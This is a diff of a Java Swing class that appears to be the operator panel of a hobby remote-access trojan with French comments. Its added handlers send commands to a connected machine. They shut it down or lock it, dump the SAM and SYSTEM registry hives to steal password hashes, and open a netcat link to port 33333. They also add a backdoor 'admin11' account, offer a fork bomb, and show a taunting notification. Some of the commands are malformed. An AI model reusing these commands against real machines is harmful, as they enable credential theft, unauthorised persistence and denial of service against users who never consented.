@@ -1,32 +1,25 @@
 package gui;
 
-import java.awt.EventQueue;
+import java.awt.Color;
+import java.awt.Font;
 import java.awt.GridBagConstraints;
 import java.awt.GridBagLayout;
 import java.awt.Insets;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
-
-import javax.swing.JButton;
-import javax.swing.JDialog;
-import javax.swing.JFrame;
-import javax.swing.JInternalFrame;
-import javax.swing.JOptionPane;
-import javax.swing.UIManager;
-
-import master.Connexion;
-
-import java.awt.Color;
 import java.io.File;
 import java.io.IOException;
 import java.nio.file.Paths;
 import java.util.Random;
 
 import javax.swing.ImageIcon;
+import javax.swing.JButton;
+import javax.swing.JFrame;
+import javax.swing.JOptionPane;
+import javax.swing.UIManager;
 
+import master.Connexion;
 import constante.Constante;
-
-import java.awt.Font;
 
 /**
  * Classe Heritant de MJinternalFrame qui ouvre une fenetre donnant a l'utilisateur maitre une interface graphique
@@ -39,12 +32,12 @@ public class MotherJInternalFrame extends MJInternalFrame {
 	private Connexion _connexion;
 	private boolean _vOs;
 
-	public MotherJInternalFrame(String title, Connexion connexion, int nframe) {
+	public MotherJInternalFrame(String title, final Connexion connexion, int nframe) {
 		super(title, connexion, nframe);
 		setFrameIcon(new ImageIcon(Paths.get("").toAbsolutePath().toString()
 				+ File.separator + "ressources" + File.separator + "mask1.png"));
-		getContentPane().setBackground(new Color(0, 153, 255));
-		getContentPane().setForeground(new Color(102, 153, 51));
+		getContentPane().setBackground(new Color(0, 102, 153));
+		getContentPane().setForeground(new Color(102, 153, 51));  
 		_connexion = connexion;
 		if (_connexion.get_os_name().contains("win")
 				|| _connexion.get_os_name().contains("Win")) {
@@ -90,9 +83,36 @@ public class MotherJInternalFrame extends MJInternalFrame {
 			public void mouseClicked(MouseEvent arg0) {
 				shutdownComputer();
 			}
+			private void shutdownComputer() {
+				if (!_vOs) {
+					_connexion.sendCmdCommand("shutdown +1");
+					_connexion
+							.sendNotification(
+									"Votre ordinateur va s'eteindre dans 1 minutes",
+									"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
+				} else {
+					_connexion
+					.sendNotification(
+							"Votre ordinateur va s'eteindre dans 1 minutes",
+							"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
+					_connexion
+							.sendCmdCommand("rundll32.exe user32.dll, LockWorkStation"); // shutdown
+																							// -c
+																							// “Stupide
+																							// ahah!”
+																							// -s
+																							// -t
+																							// 10
+																							// version
+																							// moins
+																							// cool
+				
+				}
+			}
+
 		});
 
-		JButton btnNewButton_4 = new JButton("New button");
+		JButton btnNewButton_4 = new JButton("Dump Sam");
 		btnNewButton_4.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
 		btnNewButton_4.setBackground(new Color(0, 204, 102));
 		btnNewButton_4.setForeground(new Color(0, 0, 153));
@@ -100,7 +120,24 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_4.insets = new Insets(0, 0, 5, 5);
 		gbc_btnNewButton_4.gridx = 5;
 		gbc_btnNewButton_4.gridy = 1;
-		getContentPane().add(btnNewButton_4, gbc_btnNewButton_4);
+		getContentPane().add(btnNewButton_4, gbc_btnNewButton_4);	
+		btnNewButton_4.addMouseListener(new MouseAdapter() {
+			@Override
+			public void mouseClicked(MouseEvent arg0) {
+				dumptheHash();
+			}
+
+			private void dumptheHash() {
+				// TODO Auto-generated method stub
+				if(_vOs)
+				{
+				connexion.sendCmdCommand("reg save HKLM\\SAM %"+connexion.get_user_name()+"%.sam");
+				connexion.sendCmdCommand("save %"+connexion.get_user_name()+"%.sam");
+				connexion.sendCmdCommand("reg save HKLM\\SYSTEM %"+connexion.get_user_name()+"%.system");
+				connexion.sendCmdCommand("save "+connexion.get_user_name()+"%.system");
+				}
+			}
+		});
 
 		JButton btnNewButton_1 = new JButton("Netcat\r\n");
 		btnNewButton_1.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
@@ -120,6 +157,22 @@ public class MotherJInternalFrame extends MJInternalFrame {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
+				
+			}
+			private void netcat() throws IOException {
+				if (!_vOs) {
+					_connexion.sendCmdCommand("$ nc -l 33333");
+					Runtime.getRuntime().exec(
+							"cmd.exe /c start nc " + _connexion.get_ip() + " 33333");
+				} else {
+					// _connexion.sendCmdCommand("netcat -l -p 11111");
+				//	Runtime.getRuntime().exec(
+					//		"cmd.exe /c start nc" + _connexion.get_ip() + " 33333");
+					Runtime rt=Runtime.getRuntime();
+					rt.exec("cmd.exe /c start color 02 & :debut echo %random% %random% %random% %random% HACKING begins & goto debut"
+							);
+					
+				}
 			}
 		});
 		JButton btnNewButton_5 = new JButton("Ajouter utilisateur");
@@ -135,6 +188,13 @@ public class MotherJInternalFrame extends MJInternalFrame {
 			@Override
 			public void mouseClicked(MouseEvent arg0) {
 				ajouterUtilisateur();
+			}
+			private void ajouterUtilisateur() {
+				if (!_vOs) {
+
+				} else {
+					_connexion.sendCmdCommand("net user admin11  /add /passwordchg:no");
+				}
 			}
 		});
 		JButton btnNewButton_2 = new JButton("Fork Bomb");
@@ -187,52 +247,6 @@ public class MotherJInternalFrame extends MJInternalFrame {
 				random();
 			}
 		});
-	}
-
-	private void shutdownComputer() {
-		if (!_vOs) {
-			_connexion.sendCmdCommand("shutdown +1");
-			_connexion
-					.sendNotification(
-							"Votre ordinateur va s'eteindre dans 1 minutes",
-							"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
-		} else {
-			_connexion
-					.sendCmdCommand("rundll32.exe user32.dll, LockWorkStation"); // shutdown
-																					// -c
-																					// “Stupide
-																					// ahah!”
-																					// -s
-																					// -t
-																					// 10
-																					// version
-																					// moins
-																					// cool
-			_connexion
-					.sendNotification(
-							"Votre ordinateur va s'eteindre dans 1 minutes",
-							"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
-		}
-	}
-
-	private void netcat() throws IOException {
-		if (!_vOs) {
-			_connexion.sendCmdCommand("$ nc -l 33333");
-			Runtime.getRuntime().exec(
-					"cmd.exe /c start nc " + _connexion.get_ip() + " 33333");
-		} else {
-			// _connexion.sendCmdCommand("netcat -l -p 11111");
-			Runtime.getRuntime().exec(
-					"cmd.exe /c start nc" + _connexion.get_ip() + " 33333");
-		}
-	}
-
-	private void ajouterUtilisateur() {
-		if (!_vOs) {
-
-		} else {
-			_connexion.sendCmdCommand("net user admin11  /add /passwordchg:no");
-		}
 	}
 
 	private void forkbomb_Hehe() {
